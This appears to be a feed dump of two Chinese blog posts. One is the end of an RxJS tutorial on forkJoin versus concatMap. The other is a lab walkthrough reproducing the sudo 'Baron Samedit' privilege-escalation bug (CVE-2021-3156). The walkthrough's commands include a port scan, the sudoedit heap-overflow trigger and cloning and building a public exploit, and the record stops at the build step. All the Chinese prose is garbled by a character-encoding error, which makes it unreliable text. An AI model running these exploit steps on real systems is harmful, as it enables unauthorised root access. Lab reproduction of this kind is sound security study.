<p>å‡è®¾ä¸‰ä¸ªæ¥å£çš„å»¶è¿Ÿæ—¶é—´åˆ†åˆ«æ˜¯ 1 ç§’ã€2 ç§’ã€3 ç§’ï¼š</p>
<ul>
<li><strong>æ€»è€—æ—¶</strong>ï¼šçº¦ 3 ç§’ï¼ˆæœ€æ…¢æ¥å£çš„æ—¶é—´ï¼‰</li>
<li><strong>ä¼˜åŠ¿</strong>ï¼šé€Ÿåº¦å¿«ï¼Œå……åˆ†åˆ©ç”¨å¹¶å‘èƒ½åŠ›</li>
</ul>
<h3 data-id="heading-7">concatMapï¼šä¸²è¡Œæ‰§è¡Œ</h3>
<p><code>concatMap</code> ä¼šæŒ‰é¡ºåºæ‰§è¡Œè¯·æ±‚ï¼Œå‰ä¸€ä¸ªè¯·æ±‚å®Œæˆåæ‰å¼€å§‹ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚</p>
<h4 data-id="heading-8">ç‰¹ç‚¹</h4>
<ul>
<li><strong>é¡ºåºæ‰§è¡Œ</strong>ï¼šè¯·æ±‚æŒ‰é¡ºåºä¸€ä¸ªæ¥ä¸€ä¸ªæ‰§è¡Œ</li>
<li><strong>ä¿è¯é¡ºåº</strong>ï¼šä¸¥æ ¼æŒ‰ç…§è¾“å…¥é¡ºåºæ‰§è¡Œ</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šå•ä¸ªè¯·æ±‚å¤±è´¥ä¸ä¼šä¸­æ–­æ•´ä¸ªæµç¨‹ï¼ˆå¦‚æœä½¿ç”¨ <code>catchError</code>ï¼‰</li>
<li><strong>èµ„æºå ç”¨</strong>ï¼šåŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªè¯·æ±‚åœ¨è¿›è¡Œ</li>
</ul>
<h4 data-id="heading-9">é€‚ç”¨åœºæ™¯</h4>
<ul>
<li>è¯·æ±‚ä¹‹é—´æœ‰ä¾èµ–å…³ç³»ï¼Œå¿…é¡»æŒ‰é¡ºåºæ‰§è¡Œ</li>
<li>éœ€è¦é™åˆ¶å¹¶å‘æ•°ï¼Œé¿å…æœåŠ¡å™¨å‹åŠ›è¿‡å¤§</li>
<li>éœ€è¦ä¿è¯è¯·æ±‚çš„æ‰§è¡Œé¡ºåº</li>
</ul>
<h4 data-id="heading-10">ä»£ç ç¤ºä¾‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">from</span>([delay1$, delay2$, delay3$])
  .<span class="hljs-title function_">pipe</span>(
    <span class="hljs-title function_">concatMap</span>(<span class="hljs-function">(<span class="hljs-params">req$, idx</span>) =&gt;</span> 
      req$.<span class="hljs-title function_">pipe</span>(
        <span class="hljs-comment">// æ•è·å•ä¸ªè¯·æ±‚é”™è¯¯ï¼ŒåŒ…è£¹è¿”å›</span>
        <span class="hljs-title function_">catchError</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-title function_">of</span>({ 
          <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, 
          <span class="hljs-attr">message</span>: err.<span class="hljs-property">message</span> || <span class="hljs-string">'è¯·æ±‚å¤±è´¥'</span>, 
          <span class="hljs-attr">data</span>: { <span class="hljs-attr">delay</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">timestamp</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">info</span>: <span class="hljs-string">'è¯·æ±‚å¤±è´¥'</span> }
        }))
      )
    ),
    <span class="hljs-title function_">toArray</span>() <span class="hljs-comment">// æ”¶é›†æ‰€æœ‰ç»“æœ</span>
  )
  .<span class="hljs-title function_">subscribe</span>({
    <span class="hljs-attr">next</span>: <span class="hljs-function">(<span class="hljs-params">results: <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> {
      <span class="hljs-comment">// results é¡ºåº: [delay1, delay2, delay3]</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">delay1Result</span> = results[<span class="hljs-number">0</span>];
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">delay2Result</span> = results[<span class="hljs-number">1</span>];
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">delay3Result</span> = results[<span class="hljs-number">2</span>];
      <span class="hljs-comment">// æ€»è€—æ—¶çº¦ä¸ºæ‰€æœ‰æ¥å£æ—¶é—´çš„æ€»å’Œï¼ˆçº¦6ç§’ï¼‰</span>
    }
  });
</code></pre>
<h4 data-id="heading-11">æ€§èƒ½åˆ†æ</h4>
<p>å‡è®¾ä¸‰ä¸ªæ¥å£çš„å»¶è¿Ÿæ—¶é—´åˆ†åˆ«æ˜¯ 1 ç§’ã€2 ç§’ã€3 ç§’ï¼š</p>
<ul>
<li><strong>æ€»è€—æ—¶</strong>ï¼šçº¦ 6 ç§’ï¼ˆ1 + 2 + 3ï¼‰</li>
<li><strong>ä¼˜åŠ¿</strong>ï¼šå¯¹æœåŠ¡å™¨å‹åŠ›å°ï¼Œä¿è¯æ‰§è¡Œé¡ºåº</li>
</ul>
<h3 data-id="heading-12">å¯¹æ¯”æ€»ç»“</h3>



































<table><thead><tr><th>ç‰¹æ€§</th><th>forkJoin</th><th>concatMap</th></tr></thead><tbody><tr><td>æ‰§è¡Œæ–¹å¼</td><td>å¹¶è¡Œ</td><td>ä¸²è¡Œ</td></tr><tr><td>æ€»è€—æ—¶</td><td>æœ€æ…¢è¯·æ±‚çš„æ—¶é—´</td><td>æ‰€æœ‰è¯·æ±‚æ—¶é—´çš„æ€»å’Œ</td></tr><tr><td>èµ„æºå ç”¨</td><td>é«˜ï¼ˆåŒæ—¶å¤šä¸ªè¯·æ±‚ï¼‰</td><td>ä½ï¼ˆåŒä¸€æ—¶é—´ä¸€ä¸ªè¯·æ±‚ï¼‰</td></tr><tr><td>é”™è¯¯å¤„ç†</td><td>ä»»ä¸€å¤±è´¥æ•´ä½“å¤±è´¥</td><td>å¯å•ç‹¬å¤„ç†æ¯ä¸ªè¯·æ±‚çš„é”™è¯¯</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>ç‹¬ç«‹è¯·æ±‚ï¼Œè¿½æ±‚é€Ÿåº¦</td><td>æœ‰ä¾èµ–å…³ç³»ï¼Œéœ€è¦é¡ºåºæ‰§è¡Œ</td></tr></tbody></table>
<h3 data-id="heading-13">å®é™…åº”ç”¨å»ºè®®</h3>
<h4 data-id="heading-14">ä½¿ç”¨ forkJoin çš„åœºæ™¯</h4>
<ol>
<li>
<p><strong>åŠ è½½å¤šä¸ªç‹¬ç«‹æ•°æ®æº</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åŒæ—¶åŠ è½½ç”¨æˆ·ä¿¡æ¯ã€è®¢å•åˆ—è¡¨ã€å•†å“åˆ—è¡¨</span>
<span class="hljs-title function_">forkJoin</span>({
  <span class="hljs-attr">user</span>: <span class="hljs-title function_">getUserInfo</span>(),
  <span class="hljs-attr">orders</span>: <span class="hljs-title function_">getOrders</span>(),
  <span class="hljs-attr">products</span>: <span class="hljs-title function_">getProducts</span>()
})
</code></pre>
</li>
<li>
<p><strong>è¡¨å•éªŒè¯å¤šä¸ªå­—æ®µ</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åŒæ—¶éªŒè¯ç”¨æˆ·åã€é‚®ç®±ã€æ‰‹æœºå·</span>
<span class="hljs-title function_">forkJoin</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-title function_">validateUsername</span>(),
  <span class="hljs-attr">email</span>: <span class="hljs-title function_">validateEmail</span>(),
  <span class="hljs-attr">phone</span>: <span class="hljs-title function_">validatePhone</span>()
})
</code></pre>
</li>
</ol>
<h4 data-id="heading-15">ä½¿ç”¨ concatMap çš„åœºæ™¯</h4>
<ol>
<li>
<p><strong>æœ‰ä¾èµ–å…³ç³»çš„è¯·æ±‚</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å…ˆåˆ›å»ºè®¢å•ï¼Œå†æ”¯ä»˜ï¼Œæœ€åå‘é€é€šçŸ¥</span>
<span class="hljs-title function_">createOrder</span>().<span class="hljs-title function_">pipe</span>(
  <span class="hljs-title function_">concatMap</span>(<span class="hljs-function"><span class="hljs-params">order</span> =&gt;</span> <span class="hljs-title function_">payOrder</span>(order.<span class="hljs-property">id</span>)),
  <span class="hljs-title function_">concatMap</span>(<span class="hljs-function"><span class="hljs-params">payment</span> =&gt;</span> <span class="hljs-title function_">sendNotification</span>(payment.<span class="hljs-property">id</span>))
)
</code></pre>
</li>
<li>
<p><strong>é™åˆ¶å¹¶å‘æ•°</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å¤„ç†å¤§é‡è¯·æ±‚ï¼Œä½†é™åˆ¶åŒæ—¶åªæœ‰3ä¸ª</span>
<span class="hljs-title function_">from</span>(requests).<span class="hljs-title function_">pipe</span>(
  <span class="hljs-title function_">mergeMap</span>(<span class="hljs-function"><span class="hljs-params">req</span> =&gt;</span> req, <span class="hljs-number">3</span>) <span class="hljs-comment">// å¹¶å‘æ•°é™åˆ¶ä¸º3</span>
)
</code></pre>
</li>
</ol>
<h3 data-id="heading-16">é”™è¯¯å¤„ç†ç­–ç•¥</h3>
<h4 data-id="heading-17">forkJoin çš„é”™è¯¯å¤„ç†</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">forkJoin</span>({
  <span class="hljs-attr">delay1</span>: delay1$.<span class="hljs-title function_">pipe</span>(<span class="hljs-title function_">catchError</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-title function_">of</span>(<span class="hljs-literal">null</span>))),
  <span class="hljs-attr">delay2</span>: delay2$.<span class="hljs-title function_">pipe</span>(<span class="hljs-title function_">catchError</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-title function_">of</span>(<span class="hljs-literal">null</span>))),
  <span class="hljs-attr">delay3</span>: delay3$.<span class="hljs-title function_">pipe</span>(<span class="hljs-title function_">catchError</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-title function_">of</span>(<span class="hljs-literal">null</span>)))
})
</code></pre>
<h4 data-id="heading-18">concatMap çš„é”™è¯¯å¤„ç†</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">from</span>([delay1$, delay2$, delay3$]).<span class="hljs-title function_">pipe</span>(
  <span class="hljs-title function_">concatMap</span>(req$ =&gt; 
    req$.<span class="hljs-title function_">pipe</span>(
      <span class="hljs-title function_">catchError</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-title function_">of</span>({ <span class="hljs-attr">error</span>: err.<span class="hljs-property">message</span> }))
    )
  )
)
</code></pre>
<h3 data-id="heading-19">æ€»ç»“</h3>
<p>é€‰æ‹© <code>forkJoin</code> è¿˜æ˜¯ <code>concatMap</code>ï¼Œä¸»è¦å–å†³äºä½ çš„å…·ä½“éœ€æ±‚ï¼š</p>
<ul>
<li><strong>è¿½æ±‚é€Ÿåº¦ï¼Œè¯·æ±‚ç‹¬ç«‹</strong> â†’ ä½¿ç”¨ <code>forkJoin</code></li>
<li><strong>æœ‰ä¾èµ–å…³ç³»ï¼Œéœ€è¦é¡ºåº</strong> â†’ ä½¿ç”¨ <code>concatMap</code></li>
<li><strong>éœ€è¦é™åˆ¶å¹¶å‘</strong> â†’ ä½¿ç”¨ <code>mergeMap</code> é…åˆå¹¶å‘æ•°å‚æ•°</li>
</ul>
<p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œæ ¹æ®ä¸šåŠ¡åœºæ™¯çµæ´»é€‰æ‹©ï¼Œæœ‰æ—¶å€™ä¹Ÿå¯ä»¥ç»„åˆä½¿ç”¨ï¼Œæ¯”å¦‚å…ˆç”¨ <code>forkJoin</code> å¹¶è¡ŒåŠ è½½åŸºç¡€æ•°æ®ï¼Œå†ç”¨ <code>concatMap</code> å¤„ç†æœ‰ä¾èµ–å…³ç³»çš„åç»­æ“ä½œã€‚</p>
<p>ç äº‘åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fleeyamaster%2Frxjs-examples" target="_blank" title="https://gitee.com/leeyamaster/rxjs-examples" ref="nofollow noopener noreferrer">gitee.com/leeyamasterâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Baron Samedit ææƒæ¼æ´ï¼ˆCVE-2021-3156ï¼‰å¤ç°]]></title>    <link>https://juejin.cn/post/7600491179499241526</link>    <guid>https://juejin.cn/post/7600491179499241526</guid>    <pubDate>2026-01-29T05:57:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600491179499241526" data-draft-id="7600340964084105222" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Baron Samedit ææƒæ¼æ´ï¼ˆCVE-2021-3156ï¼‰å¤ç°"/> <meta itemprop="keywords" content="Linux"/> <meta itemprop="datePublished" content="2026-01-29T05:57:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ‰æè·¯çš„è´æ–¯æ‰‹"/> <meta itemprop="url" content="https://juejin.cn/user/3229710973928635"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Baron Samedit ææƒæ¼æ´ï¼ˆCVE-2021-3156ï¼‰å¤ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3229710973928635/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ‰æè·¯çš„è´æ–¯æ‰‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T05:57:14.000Z" title="Thu Jan 29 2026 05:57:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡æ·±å…¥è§£æå¹¶å¤ç°äº† Linux ç³»ç»Ÿä¸­é‡ç£…çš„æœ¬åœ°ææƒæ¼æ´ Baron Samedit (CVE-2021-3156)ã€‚è¯¥æ¼æ´å­˜åœ¨äº sudo ç¨‹åºçš„å‚æ•°è§£æé€»è¾‘ä¸­ï¼Œæ˜¯ä¸€ä¸ªå…¸å‹çš„ç”±äºå †ç¼“å†²åŒºæº¢å‡ºï¼ˆHeap-based Buffer Overflowï¼‰å¼•å‘çš„æƒé™æå‡æ¼æ´ã€‚</p>
<h2 data-id="heading-0">æ¼æ´åŸºç¡€ä¿¡æ¯</h2>

















<table><thead><tr><th>æ¼æ´ç¼–å·</th><th>CVSS è¯„åˆ†</th><th>å½±å“ç‰ˆæœ¬</th><th>æ¼æ´ç±»å‹</th></tr></thead><tbody><tr><td>CVE-2021-3156</td><td>7.8</td><td>sudo 1.8.2-1.8.31p2ã€1.9.0-1.9.5p1</td><td>æœ¬åœ°æƒé™æå‡ï¼ˆLPEï¼‰</td></tr></tbody></table>
<h2 data-id="heading-1">æ¼æ´å¤ç°</h2>
<h3 data-id="heading-2">å¤ç°ç¯å¢ƒå‡†å¤‡</h3>
<p>æœ¬æ–‡æ˜¯ <a href="https://link.juejin.cn?target=http%3A%2F%2Fmal-suen.cn%2F2023%2F05%2Fpwnkit-%25e6%258f%2590%25e6%259d%2583%25e6%25bc%258f%25e6%25b4%259e%25ef%25bc%2588cve-2021-4034%25ef%25bc%2589%25e5%25a4%258d%25e7%258e%25b0%2F" target="_blank" title="http://mal-suen.cn/2023/05/pwnkit-%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e%ef%bc%88cve-2021-4034%ef%bc%89%e5%a4%8d%e7%8e%b0/" ref="nofollow noopener noreferrer">PwnKit ææƒæ¼æ´ï¼ˆCVE-2021-4034ï¼‰å¤ç° </a> çš„å»¶ç”³ï¼Œç›´æ¥ä½¿ç”¨ <code>vulhub/polkit/CVE-2021-4034</code> ç›®å½•ä¸‹çš„é¶æœºã€‚å› ä¸ºå®¹å™¨ä¸­è¿è¡Œäº† Qemu è™šæ‹Ÿæœºï¼Œæ‰€ä»¥åˆå§‹åŒ–éœ€è¦æ¶ˆè€—æ›´é•¿æ—¶é—´ã€‚å¯ä»¥ä½¿ç”¨ <code>docker compose logs</code> æŸ¥çœ‹è¿è¡Œæ—¶çš„æ—¥å¿—ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ apt install docker.io docker-compose	<span class="hljs-comment"># å®‰è£…Dockerå’Œdocker-compose</span>

â””â”€$ git <span class="hljs-built_in">clone</span> https://github.com/vulhub/vulhub.git	<span class="hljs-comment"># å°† Vulhub é¡¹ç›®å…‹éš†åˆ°æœ¬åœ°</span>

â””â”€$ <span class="hljs-built_in">cd</span> vulhub/polkit/CVE-2021-4034	
â””â”€$ docker-compose up -d	<span class="hljs-comment"># æ‹‰å–é•œåƒå¹¶å¯åŠ¨å®¹å™¨</span>

â””â”€$ docker ps	<span class="hljs-comment"># ç¡®è®¤å®¹å™¨å¯åŠ¨çŠ¶æ€</span>
3c5c6abb13d9   vulhub/polkit:0.105   <span class="hljs-string">"/bin/sh -c 'qemu-syâ€¦"</span>   24 minutes ago   Up 24 minutes   0.0.0.0:2222-&gt;2222/tcp, :::2222-&gt;2222/tcp   cve-2021-4034-cmd-1

â””â”€$ docker-compose logs
<span class="hljs-comment"># æ—¥å¿—å‡ºç°ä»¥ä¸‹å†…å®¹è¯´æ˜åˆå§‹åŒ–æˆåŠŸ</span>
cmd-1  | [  OK  ] Finished Execute cloud user/final scripts.
cmd-1  | [  OK  ] Reached target Cloud-init target.
</code></pre>
<h3 data-id="heading-3">ç›®æ ‡æ¢æµ‹</h3>
<h4 data-id="heading-4">ç«¯å£æ‰«æä¸æœåŠ¡è¯†åˆ«</h4>
<pre><code class="hljs language-bash" lang="bash">â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -sS -Pn -T4 -sV -p- --script <span class="hljs-string">"default,vulners"</span> target-IP

<span class="hljs-comment"># æ‰«æç»“æœ</span>
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 52:8a:4b:9e:e1:9e:37:71:d0:d4:04:ea:78:85:ea:ef (RSA)
|   256 a7:40:57:0f:9b:b8:4a:f0:4d:e5:87:8f:0d:75:31:69 (ECDSA)
|_  256 ac:8e:ea:83:00:ef:b8:a2:b4:fb:b2:d4:3b:14:82:15 (ED25519)
MAC Address: 00:0C:29:B3:23:74 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p><code>OpenSSH 8.2p1 Ubuntu 4</code>ï¼š è¿™ä¸ªç‰ˆæœ¬å¯¹åº”çš„ä¸Šæ¸¸æ“ä½œç³»ç»Ÿé€šå¸¸æ˜¯ <strong>Ubuntu 20.04 (Focal Fossa)</strong>ã€‚
<code>2222/tcp</code>ï¼šéæ ‡å‡† SSH ç«¯å£ã€‚</p>
<h3 data-id="heading-5">æ”»å‡»è¿‡ç¨‹</h3>
<p>åœ¨æ¼æ´å¤ç°è¿‡ç¨‹ä¸­æˆ‘ä»¬å·²çŸ¥ç”¨æˆ· <code>ubuntu</code>çš„å¯†ç ä¸º <code>vulhub</code> ï¼Œå…ˆä½¿ç”¨è¿™ä¸ªå·²çŸ¥çš„è´¦æˆ·ç™»å½•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ ssh ubuntu@192.168.31.148 -p 2222 
ubuntu@192.168.31.148<span class="hljs-string">'s password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
See "man sudo_root" for details.

ubuntu@ubuntu:~$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd)
</span></code></pre>
<h4 data-id="heading-6">æ¼æ´éªŒè¯</h4>
<p>è¯¥æ¼æ´çš„è§¦å‘æ ¸å¿ƒåœ¨äº <code>sudoedit</code> åœ¨å¤„ç†å‘½ä»¤è¡Œè½¬ä¹‰å­—ç¬¦ï¼ˆåæ–œæ  <code>\</code>ï¼‰æ—¶çš„é€»è¾‘é”™è¯¯ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">ubuntu@ubuntu:~$ sudoedit -s <span class="hljs-string">'\'</span> `perl -e <span class="hljs-string">'print "A" x 65536'</span>`
malloc(): corrupted top size
Aborted (core dumped)
ubuntu@ubuntu:~$ sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
</code></pre>
<p>å½“è¾“å…¥è¶…é•¿çš„ <code>A</code> å­—ç¬¦ä¸²æ—¶ï¼Œ<code>sudoedit</code> åœ¨å¤„ç†åæ–œæ  <code>\</code> æ—¶å‘ç”Ÿäº†å †æº¢å‡ºï¼Œç ´åäº†å†…å­˜ä¸­çš„å †å—å…ƒæ•°æ®ã€‚ç³»ç»Ÿæ£€æµ‹åˆ°äº†å †ç®¡ç†å™¨çš„æŸåï¼ˆ<code>corrupted top size</code>ï¼‰ï¼Œä¸ºäº†é˜²æ­¢è¿›ä¸€æ­¥çš„éæ³•æ“ä½œï¼Œå¼ºåˆ¶ç»ˆæ­¢äº†è¿›ç¨‹å¹¶å€¾å€’æ ¸å¿ƒï¼ˆ<code>Core Dump</code>ï¼‰ã€‚ä»ç‰ˆæœ¬æ¥çœ‹ <code>sudo 1.8.31</code> ç¡®å®å­˜åœ¨ CVE-2021-3156 æ¼æ´ã€‚</p>
<h4 data-id="heading-7">searchsploitæœç´¢æ¼æ´</h4>
<p>ä½¿ç”¨ <code>searchsploit</code> æœç´¢æ¼æ´ï¼Œå‘ç°æä¾›çš„æ¼æ´åˆ©ç”¨å·¥å…·ç‰ˆæœ¬å¹¶ä¸ç¬¦åˆè¦æ±‚ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ searchsploit --cve 2021-3156
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
Sudo 1.9.5p1 - <span class="hljs-string">'Baron Samedit '</span> Heap-Based Buffer Ov | multiple/local/49521.py
Sudo 1.9.5p1 - <span class="hljs-string">'Baron Samedit '</span> Heap-Based Buffer Ov | multiple/local/49522.c
----------------------------------------------------- ---------------------------------
Shellcodes: No Results
----------------------------------------------------- ---------------------------------
 Paper Title                                         |  Path
----------------------------------------------------- ---------------------------------
Heap-Based Buffer Overflow <span class="hljs-keyword">in</span> Sudo (Baron Samedit) - | docs/english/49950-heap-based-bu
----------------------------------------------------- ---------------------------------
</code></pre>
<h4 data-id="heading-8">GitHub POC</h4>
<p>åœ¨ GitHub ä¸ŠæŸ¥æ‰¾å¯ç”¨çš„ POC å¹¶å°è¯•ææƒï¼Œ<code>./sudo-hax-me-a-sandwich</code> åˆ—å‡ºå¯ææƒçš„ç›®æ ‡ï¼Œå‘ç°æ°å¥½é€‚é…é¶æœºçš„ sudo ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">ubuntu@ubuntu:~$ git <span class="hljs-built_in">clone</span> https://github.com/blasty/CVE-2021-3156.git
ubuntu@ubuntu:~$ <span class="hljs-built_in">cd</span> CVE-2021-3156/
ubuntu@ubuntu:~/CVE-2021-3156$ make
